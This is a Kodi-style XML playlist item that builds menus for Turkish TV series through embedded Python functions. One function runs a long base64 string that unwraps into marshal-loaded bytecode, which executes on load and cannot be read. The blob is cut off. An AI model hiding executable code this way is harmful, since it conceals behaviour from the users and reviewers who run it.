<?xml version="1.0" encoding="UTF-8" standalone="yes"?>

<item>
<title>[COLOR orangered]SERIES TURCAS [COLOR white]Cristal [COLOR yellow](Nuevo)[/COLOR]</title>
<link>$doregex[makelist2]</link>
<regex>
<name>makelist2</name>
<listrepeat><![CDATA[
<title>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</title>
<info>[COLOR white][makelist2.param1] [COLOR aqua][makelist2.param4] [makelist2.param5][/COLOR]</info>
<link>$doregex[temp]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>temp</name>
<listrepeat><![CDATA[
<title>[COLOR white][temp.param1] [temp.param2][/COLOR]</title>
<info>[COLOR white][makelist2.param3] [temp.param1][/COLOR]</info>
<link>$doregex[cap]</link>
<thumbnail>[makelist2.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
serie = '[makelist2.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,shutil,random,urllib2
import base64;exec(base64.b64decode(""))

]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MFp4QUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFVlROT2JVMHpUbFJWZDA1dFdYcE5SRmsxVGxSak1rNXFXbXROYlVrelRVUktiVTE2UVRCYVZGSnFUWHBuZWs5VVVYaE9Na1V5V2tSak1FNUVZekJaYWxrMVRYcFZlazFVVlRCT1Iwa3lUbFJOZVU1NlRUQk9hbEY2VFhwUk0wNTZVVEpPZW1jd1dsUk5lVTVxVFRKWlZGSnJUa2RGTWxwRVdUUk9hbFV5VFdwWmVrNTZRVEJaZWxwclRsZEZNbHBVVVhwT2Fra3dUV3BTYlU1SFRURlBSRTB6VFhwTk1rNVVVWHBPZWtrd1dtcGplRTVYUlhwTlZGcHJUbnBGZWsxVVVUQk5lbGt6VGtSVmVrNXFhekphYWxWNlRrUnJNRnBxVVRST1JGa3pUbFJaZWs1VVZYcE9WRTAwVGxSbmVrOVVXWGhPYWxreVRtcGplVTV0VVhwTlJFcHBUbXBWZWsxNldYbE5lbFV5VGtSamVrNTZXWHBPVkVwdFRtMVZNbHBVV214TmJWbDZUbnBOZDA1NmF6TlpWRmw0VG5wck1rNXFZekpOZW1NelRVUk5NVTE2VlhsWmFtTXhUbFJSTVU5RVdURk5lbU14VFVSTmVrMTZVWHBPVkZwc1RYcE5lazVxVFROT1ZFRXdXV3BOZWsxdFNYcFBWRmt6VG5wWk1GcFVZelZPUkdkNVdtcE5NMDF0U1RKTlZGa3lUbTFSTWs1RVl6Rk5iVmt5VGxSU2FrMTZaekJhVkdNeVRucFplVnBxWkdoT2JVVXlXWHBOZUUxdFNUSk9SRmt4VGxSWk1GcHFXVEpPYlZGNVdtcE5lRTVFWnpGWlZGazBUWHBCTTAxcVl6Uk5lazB3V1hwVk5FNXFaekphVkUwMFRucEpNRTlFVlRCT1Ixa3dXWHBaTTAxNlJUQlBSRlpvVGtSak1VOUVUVE5PVkdjeVdsUlZNazE2WjNwTmVsRTBUWHBOTWxwVVkzbE9SRmw2VFdwYWEwNHlSVEJPYWxVeVRtMVJNVTVVVW1sT2VsRjZUbnBWTkU0eVJUSk9SRlYzVGxkRk0wMVVZM2hOZW10NlRrUmFhazV0VVRKTmVtTXdUbnBGTUU1cVVtMU9hbEY1V21wTk1FNVhSWHBOVkUxNlRsUkpNbHBVV21oT2VrVXhUbXBXYUUxNlRURk9lbFYzVGtkUmVrNUVUVEpOYlVsNlRsUk5NRTU2VFRKYWFrMHhUbnBGTVUxRVkzbE9SMVV5V2xSTk1VMTZTVE5PVkdNeFRYcGpNazFVVlhkT2FtTXlUbXBWZWsxNlp6Tk5WRmt5VGxSamVWcHFVVEZOYlVrelRrUk5NazVIU1ROT1JGVXlUbFJSTWxscVVtbE9hbWN5VGxSS2FVNUhXVEJOYWxwb1RucEJNazVVV1RSTmVtc3pUMFJaZVU1VVdYbGFhbEV6VG1wak1sbFVXVEZPUjFrelRrUlpORTVxVVROT1ZHTjZUbnBuTWs1VVdtdE9lazB5VDBSWk1rMXRTVEpQUkZFMFRtcFpNRTFxVVRWTmVrVjVXbXBXYUU1dFRYcE9lazB5VFcxSk1sbFVTbTFPZW1ONlRWUlJNazE2UVROWlZGazBUbnBCTWsxVVRUVk9lbWN4VGxSVk0wNUVZekpOZWxrMVRYcGplazFxVVhsT2VrMHhUWHBhYUU1RVp6Qk9lbEV5VGxSQk1sbDZZekpPUkUweVdWUlJNazE2UlhwT2FsRjRUbXByTWs1VVdYaE9iVlY2VGtSTk5VNTZTWHBPVkdNeVRucFZNRmxVWTNkT1JHTXdUbnBXYUUxNlVUTk5SRlpvVGtSbk1FMXFXbXBOZWsxNVdtcGFhRTU2UlRGUFJGazBUakpGTWs1cVRUVk5la1V3VG5wUmVVMTZhekpPYWxFelRrZFJNazVVVlRGT2JWa3dXV3BaTVU0eVJUQk5hbFYzVGxSTmVrMUVZekpPYlZsNlRXcFJNVTVFVFRCUFJGazFUa2RWTUZwRVNtbE5lbGt6VGtSTk1FNUVhek5OYWxwcVRqSkZNRTVVVW1sT2VsRXhXVlJaTkU1VVVUSk5WRTB4VG0xSk1FMXFZekJPYWtVeFRtcGFhazVVUlRCWlZFMDFUWHBGTVU5RVRYcE9iVWt3V1dwUk1rNTZaekpaYW1Sb1RsUlJlazVxVVhsT2JWVXlUMFJSTTAxdFNUQk9lazB6VGtSak1VNTZWWGxPVkZreVdrUk5NVTVIVFhwTmVsVjNUWHByTUU1VVVteE9SRlY1V1dwYWFFNTZRVEZaVkZFelRtcEpNazU2VlhkTmVtc3dXa1JXYUUxdFdYcE5SRTAxVG1wbk1rMTZUVEZPVjBVeFQxUmplVTE2VFRGUFJGSnBUbXBaTTA1cVZUTk9WRWt5V2tSak1rNXFWVEJaVkZWM1RrUk5lazU2V210TmJWa3pUbXBOZVU1RVZUSk9SR016VGtSRmVrOUVTbTFPUkdNeVdrUlpNRTVIVVROUFZGbDRUbFJCTWsxVVZUTk9SRTB4VDBSYWFrNXFUVEpaZWtwdFRYcFJNMDU2VFRCT2FtY3dUbXBOTWs1VVJURk5ha3B0VG5wQk1FOVVUVFZPYW1zeVRWUmpNMDE2VFhwT2FrMHhUakpGTTA1NlkzbE9lbXQ2VGtSU2EwMXRTVE5OZWsxNlRtcGpNMDE2VFRST2VtdDZUbFJWTUU1dFNUSlphbFpvVFcxWk1rNTZWWGhOZWtFeVRtcFJOVTVxVFRKTlZGSnNUbFJOTUU1RVl6Uk9SR013V2xSYWEwMTZWVEJPUkdONVRsUm5NMDVVVVRKT1JHY3lXWHBWZVU1NldUTk9lbFV6VG5wak1sbDZUVEZPYW1NelRtcFZlVTVIVlhwUFZGVXdUbFJGTWs5VVl6Sk9WRkV5V1ZSVk0wNXFUWGxhYWxrelRXMVpNRTVxV1RKT1JGRXdXVlJWTTA1NlNYcE9SRmw1VGtkUk1rMTZXbWxPYlZVeVRtcE5lVTVFUlhsYWFrMTNUbXByTTA1RVdUSk9iVWw2VGxSTk0wNXRTVEZOYWswelRucGpNRmw2VFRST2FtZDVXbXBXYUU1cVl6Rk9SRmswVG1wak1rNXFWWGhOZWxWNlRsUk5kMDVIVlRGTlJGRTFUWHBSTVU5RVdURk9lazB5VFdwTmVrNHlSVEJOYWxWNlRXMVpNbGxVVW1oT1IxRXlXVlJSTVU1cVdYcFBWRmsxVGtSUk0wNVVUWGRPUkVreVdsUmpNazVIUlRCTlZGa3lUWHBqTVUxNlVUUk9iVWt5V1dwYWJFMXRXVEZOZWxKclRsUlpNazVxVVRWT01rVXdXbFJLYlU1SFJUTlBSRlUwVFhwVk0wMVVZek5PYlUxNVdtcGthRTVFV1ROT1JGVTFUbFJCTUZwRVVURk5iVWt5VG1wVk1FNXRWVE5OUkZVd1RucE5lazFVV1hsT1JGVXdUMFJOZVU1VVVURk9hbEpxVGxSQk1rNVVVWGhPUkZGNlRXcFJOVTV0VFhwTlZGRXlUa1JaTTA1RVZUQk9lbXN4VFVSVk1rNVVTVEpQUkZreVRYcEZNazU2WTNkTmVtY3lUMFJTYUU1VVVYcFBWRmsxVGxSSk1rMVVXbXBPYlZFd1dWUlNiVTVFYXpKT2VsSnBUa2RSTWsxNlkzcE9la1Y2VGxSUmVVNVVVVEZPZW1NelRsUnJlazlFVlROT2FtZDZUMVJOZVU1VVZUSk9ha3B0VG1wak0wNVVVbWxPUjAxNlQwUlpNMDVIV1hwT1JHTjRUbFJKTWs5RVRUSk9iVlV3VG5wUk5VMXRTVEZOYWxKc1RrUmpNVTU2WTNwT2Vtc3dUa1JqTkU1NlJUTlBWRkUwVFhwTk1scHFXbWhPYlVVeldWUlpOVTF0U1RCUFZGVjRUWHBqTVUxVVl6Tk9lbXN5VGxSS2JVNTZZekpaYWswelRtMUpNVmxVVVRGT1ZFRjZUV3BOTVU1cVNUQk5WRkV3VFcxSk0wNUVVVFZOZWxrelQwUlJNRTVIVVRKWlZHTXlUbFJyZWsxcVVtbE5iVmt3VFZSV2FFNXFXVEJPYW1OM1RrUk5NRTVFV1RKT1ZFMHdUbXBOZWs1cVNYcE9hbFY0VGxSUmVrNVVVWHBPUkZGNVdXcFpNVTVFVFRKT1JFMDFUbnByTVUxNlRUTk9SRlV4VDFSTmQwMXRXVE5PYWxwclRucEZNbHBVWkdoT1JGVXpUbXBSTWs1RVJUQk9SRmsxVGxSQmVWbHFUVEZPYWxGNlRsUlNhVTVFYXpGTlZFcHRUWHBKTUU1NlZYcE9WRTB4VFVSS2JVNUhVVEZQVkZVeVRYcFZNRnBFVW10T1JHc3pUbFJqTkU1RVJUQlplbEUwVFhwTk1sbDZVbXBPYWxFeVdrUlNiRTVxV1RKYWFrMTRUa1JSTUU5VVZUQk5iVmt3VFZSUk5FNXFXVEJaVkZFeVRsUkJNVTlFVVRGT1JFVXdXbXBOTVU1cVNUTk9SRkY1VG1wTk1VNVVWVEpOYlVreFRWUlpNMDVxUlRGTlJGVTFUbnBSTUU5VVVUQk9Na1Y2VFhwak5VNUhWVEpPYWxab1RrUk5NVTlFVFRST2FtY3pXVlJaTlU1VVp6Qk5lbEY0VFcxWk1FMXFWWGRPUkdzelRucGpOVTU2UlhwT1ZGcHBUbFJSZWsxcVdYbE9lbU13VG5wVk5FNXRVVEpQVkZWNlRtMVZlVmxxVlRST2JWVXdXbXBTYUU1RVVUSk9hbU42VG1wRmVrNVVaR2hPVkVreFQwUlplRTVFVVhsYWFscHJUbXBqTVUxNlVtcE9lbGt3VDFSamVVNTZZekJaYWsweFRrZEpNazVVVlhoTmVsVXlUMFJSZVUxNldURlBWRlUxVFhwRk1VMVVUVEJPVkVsNlQwUlJNazVVV1hwT1ZGcHNUbXBOTUU1VVVtMU5lbWN6VGxSUmVrMTZWVE5OZWxKdFRtcFplazlFVVhwT1ZFRXlXWHBqZDA1cWF6Qk5WRmt3VGtSck1rMXFUVFJPZWsweVRrUlNhMDU2UVRKWlZFcHBUbTFWTVU5VVl6Tk9SRVV6VFhwVmVFNUVXWHBPVkUweVRsUlJNRnBFVFhwT2VsVXlXWHBOTkU1Nll6QmFWRTB3VGxSSmVrNTZTbTFPYW1jd1dtcE5OVTU2VlRGUFJGVjRUbFJCZWs1cVZURk5lbWN6VG5wak1rMTZZekJQVkZKb1RsUlpNRTlFVlhoT1Ixa3hXVlJLYlUxNlRURk5lazE2VFhwWk0wMVVZM2RPUkVVeVRtcE5NVTVVVlhwUFZGVTFUa1JKTWs1NlRUUk5lbEV3VG5wWk1rNUVXVEZPYWxWNlRtcEpNRmxxVVRGT1JHZDZUbnBWZVU1cVVURk5hazE2VG1wVk1FMXFWWHBPYWtsNlQwUmpkMDF0V1ROUFZGazFUbXBSZWs5RVdteE5lbFV3VG1wVmQwMTZRVEJOYWswMVRucG5NMDE2WXpWT2FtY3lXbFJhYVU1RVozbGFhbU16VG1wSk1VNVVZM2RPZW1jd1RsUmFhVTU2WnpGTlZFMHpUbTFOTUZsVVVtMU9lbU15VGxSVk5VNVVXVEphVkZVMFRYcHJNazVVVFhkT2Vra3lXbFJOZVUxNlVURk5ha3B0VFhwUk1VNUVWWGxPVkUwd1QxUlpORTE2WTNsYWFrcHBUbnBKTUUxcVdUSk9WRVV5VDBSak5VNUVZek5PYW1NMVRrZE5NVTlVVlRWT2Fsa3pUVlJTYVUxNlp6TlBWRnByVG0xUmVWcHFXbWxPYWxVelQxUlJNazVxV1RGT1JGRTFUVzFaTUU1RVdtdE9WRVY1V21wa2FFNXFZekpPYWxwcFRtcFplVmxxWTNoT2FsRXhUbFJaTWsxNlRURk5WRTB4VGxkRk1scEVWVEpPUjFFeVQxUlJlRTVVUVhsYWFtTjZUbFJWZWs1VVdtdE9WR015V1hwak1rNTZaekJPZWxrd1RrUk5lVnBxWTNwT1IwVXhUMFJTYTA1cVkzcE9lbHBwVG1wWmVrNXFZM2RPVkdkNlRsUlJNRTVxVVRCT2FrMHhUbTFSZWsxVVVtaE5lbWN4VGxSWk1rMTZaekpQUkZKcFRucGpNVTFFVlRKT1IxbDVXbXBhYlU1NldUQk9hbEpxVG1wVmVrNUVVVFJPTWtVeVdsUlpOVTU2WTNwUFJGSnJUbnByTWs5VVNtMU9SR3N5V21wVk5FNUVaekZPVkUxM1RYcGplazE2V21wT1IwbDZUa1JhYUUxdFdURk5lbEUwVGxSVk1VNTZZekJPZWswd1RWUmpNVTV0U1ROTmFrcHRUWHBSTUZwVVZYcE9lbGt4VGtSamQwNVhSWHBPYWxWNFRXMVplazVVV20xT1ZGVXlUbXBhYlU1SFJUSk9hbEV6VFhwck1VMTZaR2hPYlVrelRtcFJOVTVFU1RKT1ZFMHdUbnBWTVU1VVRYaE9lbFV6VG1wUk5VNTZUVE5aVkZVMFRsUlpNVTE2VFhsT2JVa3hUVVJOTVU1VVdUTk5WRkpvVFcxSk1FNUVWVEJPYlVrd1drUmthRTU2UlRKYVZGSm9UbnBOZWs1cVdtaE9SRkY2VG5wTmVFNUhWWGxhYWxVeVRrZFZNRTlFVlRKT2FsRXhUMVJLYlU1Nlp6Qk5hbHBzVGpKRmVrNUVVVFJOZW1zd1RucFplazVYUlRCT2VtTTBUbFJOZWsxcVZUUk9hbEV6V1ZSamVFNXRUWGxaYWxVMVRtcG5lazE2V21wT1IxVjVXbXBTYVU1cVRYcE9SR041VFhwak1FNVVXbWhOYlVreVdtcGFhVTR5UlRKUFJGa3lUWHBuTVU1RVZUUk9WRlV4VDFSU2JFNVVUWHBPUkZwb1RucFpNMWxVV1hoT2JVa3pUMFJOZVU1cVRUQmFhbGsxVG5wQk0xbFVZM2hPUkUxNVdXcGpNMDVIUlRGT1ZGRXhUa1JaZWs5RVRURk9SMFV5V2tSamVrNVVhM3BPYWxwb1RrZE5NbGw2VVRGTmJWa3dUbXBOTUU1NlVYbFphbEUxVFhwRk1sbDZVbXBPYWswd1RYcGplazV0V1RKTmFscHNUbXBSTVZsVVdtaE9Na1Y2VGxSYWJFNTZUWHBPUkZrMVRsUm5lazlFVVRWT2JVa3lUbnBqTWs1VVl6Sk9SRmt5VGxSSk1rNUVTbWxPUjBVelRVUk5kMDVVYXpOT2FsSnRUa1JKZWs1cVVtMU5lbGt6VGxSUmRHY1FBQUJ0UVZSU2JFMTNTWFZCU2xJeFFWRk1Na0Y2VmpCTVIwMTVRVWRXTTBGSFNERkJkMGd5UVVkSU5VRlVVbTFhUjBSdFFXMUlNVUpIV2pGYWJVaHRXbEZYZWtGM1dqSmFSMFF3UVcxTU0xcHRTREZhYlhReldrZE1NVUZVUkRCTWQxbzBXbTFNTWtGUlRYVkJWRkl4V2xGYWFrRnRUR3hNZDNBMFFYZFdNVnBIY0cxQlIzZ3dUVkZhTlVGNlNHMUJiVnBzUVZSU2JVRjNjR3BhYlhBeVFWRkVhMXB0Y0RKQ1VVUnRRVEpTTTBKUlJYZEJla2d3V2tkWGRrRnRVakZDVVVsMVducE1iVnBIUkROQlIwNHhRVzFJYkZwdFRESk1SMW96UVZSTU1FeEhURzFCUjNBeVdrZGFNa0Z0VmpOYWQwVjRRVkZhYlVGSFJEVkJVWFF6UVhkSWJFRnRkREJOUjFvMVFYZDBNazFSUlhkYWJYUXlRbEZNTkZwdFRHMWFVWEYxUVcxNE0xcEhjRzFCYlhBd1FrZGFNa0ZSY0RCQ1IwdzFRVWRFTVZwM1RESmFiVll4UVZGeGRVRjZWakJOVVVSc1ducE1NbHBIVFhaQmJVZ3lUSGRJTUZwdFRqRkNSMHcxV20xU01FRlJTRFJCVVVRd1FrZE5la0Z0VEcxQ1IwZ3hRWHBJTUUxUlREUmFiVkpzVEhkTmRscHRXakJhUjB4c1FYcElNazFSVjNaQmJVNHpURWRJYkVGUmRHMWFkMFYxUVhkTWJVSkhTRFZhYlhnelFrZE5ka0Z0VERGQlIwZzFRVWQ0TVZwUlJYcEJWRnB0V25kRmRVRlJTRzFDUjB4dFFWRjRNa0Z0Y0RGQmQwZ3lRa2RJYWxwdFREQmFkMGd6UVZSYU1WcFJjREZCZWxveFdtMUlNbHA2VmpGQmJVbDFRVkY0TTFwM1dtcEJSMVl3UVZGYU1rRnRWak5CZDBRd1FYZEVNVUZIU0RCYWJVZ3dXbTFFTUVGdFVqQkJVWEF4UVhkV01WcDNUWGxCZWt3eVFXMUVORUY2VWpGYWQwZzBRVzFTTUVKSFRYZGFla3d3VEhkSU0wRnRXak5CUjFveVFWUmFNa0YzU0RSQlVVd3hXbEZGZDBGVVdqQk1iVWhyUVZGRWJWcDNTR3hCYlVneFFYZE1Na0ZVU0RKTlVVd3hRVzF3YlZwSFJESkJkMXB0UVZGSmRWcHRTREJNZDBWMVFVZE9NVXhIY0RSQlVYUnRRWGR3TUZwdFNEQkJVVTE1UVhkTU1FMTNUWGxCYlZadFdrZEVNRUZ0U0RGYWQwd3lXbTF3TWtKUldtMUJla3d3V25kYU1VRkhWbTFhYlV4dFFVcFNNVUZSV2pGQmVsSnRXbTF3TlVGNlVqTkJkMDE2UVZSV2JWcEhTREZCZWxZd1RHMU1Na0YzVmpCTWQwMTJRVzFJTWtKSFREQkJiVVF6UVcxd2JGcHRWakJhZDFkNlFWRklNRTFIV2pGQlIxSnRXbTFhTWtGNlVqSk5SMDEyUVhwYWJVRkhSREpCZWxveFduZElNVUZSVm14TWQwMTFRWGRJTUVKSFNHcEJiVWd6UVhkRU5VRjNTRE5hYlZwcldtMTRNVnBSVFhsYWJWWnRRWGRhTkZwdGRHeE5kMGhxUVhkSWJVRnRTRFJhYlhnelFYZHdhMEZIZUcxQmQwZ3dRVkY0YlZwUmNHMUJSMDR3UVcxTU5FRktVakphUjBWNlFXMTBNVXhIY0cxQlZGb3hRVkZ3TVVGVVVqRkJiWEF3UVhwRU1rRlJWM3BCZDNRelFYZElNMEZ0UkRGQ1Iwd3dRVkZ3TTBKUlNEVmFiVVJzVEhkTmVVRlVSREpCUjNBeFFYZHdNbHAzY0RWYWJWSXdRVkZ3TTBGSFREQk1SMDE1UVcxTWJVRlJTRE5CZDBReldrZEZlRUY2VW14TmQwZ3dRVzFhTTFwSFNYVkJiVll6V20xTmRVRlJUREZCVVVnelFVZEVNRTFIY0dwQlVYQXdRVzFYZGtGdGVESkNVWEJzV20xd01scDNSWFpCYlZKdFdrZE5lVmRxTUZoeFZWZGpiM3A1TUhKR1RqbFdVSEUxVFZGUFowaDRUVE53ZDAxRlJqRmpVVUpLT1d4eWVVODFUWGR4UTBVelkwdGFVM2xNVFROQlJFRXhUMDFITUdObVRUQlhXa3hIZVZsS2VWTnJSWHBOWkc4elRWZEtVbmd5UlROQlJVaEtTR3hKVkdZMFdrZzRNMGw2WjJGTlUzVlRjRXRGVFVsSU1VRklNRGwzUVVneFptOTZZMEpZTTJOV1JrbFdiWEZ0V2pKd1ZWTjVUSGxqYkc5aGNVRkJNa1ZZY0hvNVFsa3hkVVZKTVhsdWNWUTVTVUpVU1VoSk1qQnFiMGhUV2twaFVtcElNRUZKYmtwVFdVWjVTVkZKUzFKclRETkZXRUY1Y1hWR1NrVlViMVJxTVVWS1l6WnhNa2xFU0RCd05HOVRTVVZGZUZJMVRYZFhTRTFLVjFoS1lWTnRTVk5UVm5KVGREVnhNVk5OVFVvMWVrY3pXakpGUjA5dFNYb3hSMjh3UlZKQlMxSmxTSGROVTBZd2VEUkVlblUyVEhkNE5IRlVXalJhVWtFMFNXRmFNSEJKVm1WdmQzRk1Ta3RUYm05SlYwWndiWEZLYjFOYU5FcFJTWGhDU0d0Q2IwcE5ZVTE2VTJ4dVNqaHNjVEo1UzAxU1dqVnZlVVExV2tocU1VaDJPVzVNZW1OcFJIcE5XRXBJWWpWSGQzRXdUR3c1U2toS01ETkhTRGhwY25waldscDRVakZ4ZUZJMVJVbHdhVTFoU1ZsWk1GTklUSGROUzBKS2VVOUpWVTgyUlRCamQwcGhlREJ5VWpCbFJYbE5Za0YzVTJWQ1ZFbDZSa28xUzBFd2VWcEZiRGwyY1VvNU1tOVZkV3hKTW5ReVNHRmpkMjVJUVVGdU0zVmhXVEZYZVVSS2FtMVliR2R0Y1RCTU5WaHRWMmh1UjB4cVNGSkZhMWt4ZEdwdlVuRlRjREpuYVVsUVowRkNVbFpwUmxSNGJVMUlUV0p2UzFkRFRUSTVVa1o0T1hwTWJWZFVjRWwxZWt4dFRUWnZlR2QzU1RKVGJVaEhlVFZLUzA5WlNsTkJXRXhJTVZOd01rd3hibnBOTmtKS05YbGFTMkpsVEhneGRYRjZTV2x2ZDFOS1JqQlhkVzVWVWpORWQzUXhSVlJGV2taNVJYbE5kMEZHUkROTllreDZkVkpOVWxKdFJETlNiRzV0ZERKSmVHZG9URXRKWjFodFRHVnllbE42UldGalpYSktPVWh2VW5sUGNGUlNNRVpSV20xYU1sSnRSVXBOYTAxVllqSklTV05WY1RONWVHOXRRVXR5ZW5GNFRWRlRObTVWZERCYVVrVnVURWROVEc0emRWZE5VRGxtUmpOYU1VMVNPV05hU1hsNWJtMUpNa1Z0UVdWTU1sTlBTVlJOUlVsVFFXWnZlakZVYmtoeGRYRlNhbTFKU1ZkNGJsRkJSM0I1VFZwS2VrVnNXbmxOUVc5dFV6TndWR2Q2Y25wQk0xZ3lOWGhHUjNrMVFVcEVaVUY2ZURWQ1NVUmxTVlIxZDI1M2RVSkZNWGxpY2toVFVuQmhZMDl1U1dKbFNIaDFUMXBKVjJwWU1HSXhRVkpUWmtSNk1XRndNSGd4VFhsSmEwaEhWM2xNU1ZOR2JucE5Oa3d3YW1wSVZIVTFjblk0Tlc1UlRUTnhWRVZxYmtkV01Ga3pUV2RJYlZkSlFrcDVTa0Y0V21wdlNqbEJURWR4ZUc0d1UySnZlRGxzYjBseGVuQlVZMWx1TWpGclNrZFNNbG96WXpaWU1uVnVjbmhuVUc1VlZqRndiWEZoUWxOUFlrRXdTVFJZTWt3emNUTkJWVmt3Vm0xdlNrRTJXVEp4WVc1VlRXSkpSM1EwUlVkVFkwY3lVMDl2TVVGbWNHMUZka3hLVFdaRlIzRlhRVWg1VTFvd2RXaENTa2xOUmtwVFJFUkljR3RLUzA5WVRXMUZNMjl0Y1RWdlVVMWFRWGx3TUVSaFNEVk5lbkZvYmxWU01rWkxTVUZHVW5rd2J6QjBiWEZLZFdWd2VGTm1jRWRKVjAxVFZqSmFlakV6YjNkVGRrWktTVlZZYlUxM1FYaE1NVWxIY1doeVJqbHNUREJpTTBaS05WQkVNMEZLU0VkVGJVZFZlR3hCU1dNMlNVdDBNazFUY0RCdlZFVkJXbm8xZVVFeU9WTnVWRGxLUmtod00xcGhRWHBOU2tsWGNVb3hia1F6Y1dOR2VrbFdjbFJyWWtnd1JETnZNRmRyUkVkTlJuQjRNV3hIVVhsb1duZ3hha0ZSUVdKYU1rRk1Sa3RYYWtwVlkyMUdTR05WUlZOMFpWa3dlVXRhU0d0MWNVbDVOVzk0VEdWd01qbGxUREJCVDBGSVowaENTbmxsYnpKVGQxcDNUV3hKTUVReFJYZHhhVm93VEdwWU0xTlJTRE5YWjFrd1RYZEhTM1JzUjFWU1pVcGhTV0pKZG1kRGNWUlRlRzk2Y0RSSWJVbG5iekJNTVhCU01YaFliVUZOVERGMU5uQXplV3R1VkRsWFJrdGlNMDB4VWpOSFVqRlFXbmhUYVVnd09XbHZlazFXU2xOQlZrRkxUVXBFZUhFelFrcDFNRUY2YWpSeE0wRmpUVWh4UVhKSVFXMUlNblEwYjIxWFVHNUtNVTl2UzNWMVNFaG1OVnBJTldKdlNqazFTVk5UVm5GM1UzVkZNV0pyY0RKWFVHNUpkV2hKU2tnelJraEpZM0I2VTFSeFVqRlpSREZKYmtZd1UxVklNSGxtV25kQlZVbExUakJ2TTFKdFJrdDVXSEo2VjBwWk1IVlpUREJuV1VGSGNWRk1lWEJsY21GQlVXNVRVM2x2U0hsRWNsUTFWRzU2TVZkTlNqbEhUVVpuUjBkSGNXbEdlamhxVFhkUGJVVXlaM1pZTW10dFJXRmpWRzlMVDNwdlIwUnFRVVk1V25GNFdqTnVNM0ZUUm5vNWFIQkhTVnBFTUZkQ2NtRnhia3A2Y0dwSVIxTlBURW81VUhCNlUydEhVVnByV2pJd00wcFZlV2RIVkRWMWNFZDVWRzloVDFsR2QzVmxUVEJJYlV4SFRUTkhVVTFEUWxKVFYwWlJUVnBFZURGb1IxVjFhVnBLT1ZwdVIzRjFiMFk1VDBWS1NWcHdTSGxwY1RKeFdFRktVMnBOU1ZOV1NWSkJZa1I2Y1ROQlVVRlpSbEp4UlVGS1lqTlpNV05ZVFVsT05VRmhWMGhFUjNWNFdETlBaVm95TVRKTVNIRldTbFZXYWtWU1kxTnZTVmRqY0RKRmJVbFNPVlZ1UjNWb1FVbDBNM0V3ZVZKQlIzUmxjRkE0YkhGdFR6Wk5Na3d5UVZWSmRVbDNVMUZ1TTJJMFFVaFhUM0o1Y0RKTVNtWnFTVXRYZUc0eU9XbEZWVWxoU1RCMU5VcDZNVzF5UzBWM1FsSkJhbkZMVjBoR1MzUnBRa2hYTVVGSWNXTnVla1ZyV0ROUE5rZFJRVkJ1VkhWcmNHMUJSRUY0VjAxeFVVVjZjRXQ0TUVVemNVMXhVWEZIUVhkTlRFWkpSR3h1VVZwclRUSlRNbkZWUVdkS1VrMDFTVWw1VUVVemRHeEdlamxWUVhkWFdrZFJlV3RHZURRMVJFbEpNVVZVVjFGQmJVdzBUVkJtTTBoSGVWQndlVTExUjBkV01YRnNPWHBGTVZOdGNuaEJZM0pVUVd0R01FRlpibTFCYlVwUlJETktTM0ZyYmtkRWFXOUlVbXBNTWpGRWNGTnhNMFY2ZEcxdk0zRlRTRWRhYlVFd1YxUkZVM1Y2U25oalVFMVJVakZDU1hVeVduZFhkVVJIUlZGYU1IbENSSGxOYTAweWNXVk5kM1JwY2tsMVpGcDZaMUpFZDNneFNGRjRiVWRLTURGdVVqbFpTRWRTTlc4elRXVkJiVVZsV2twQmRXOVVRVmhGTVU5WlRUSjFXRWRSY1dOdlMwOVFRVEp3YVUwd1NUTnZNR0kwUm0xNVZVZExZMUp1TTFkR1JucFhla1I0YTFaYVNVRmFja3BFTlc5S2NHdEllbkZhUkROTlptNUhUMEZ5U0dKcWJsSmpiVVZ0ZFZwTmVERkRXbEZFWlVsTFYxTktZVlpyY2tkT01FVXlZMmR3U25GSlJtMXdhbHBSUVUxd2VqbHF